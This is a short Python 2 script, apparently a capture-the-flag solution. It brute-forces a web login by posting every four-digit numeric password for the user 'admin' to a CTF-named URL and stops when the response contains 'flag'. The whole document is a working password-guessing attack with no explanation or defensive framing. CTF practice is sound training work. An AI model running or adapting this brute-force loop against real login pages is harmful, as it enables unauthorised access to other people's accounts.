#!/usr/bin/env python

from itertools import product
import requests
import re
 
passwordList = product("1234567890", repeat=4)
 
for i in passwordList:
    r = requests.post("https://ctfpwnable.blacktr.org/rough/", data={'username':'admin', 'password': ''.join(i)})
    if 'flag' in r.text:
        print r.text
        break
    else:
    	print ''.join(i)
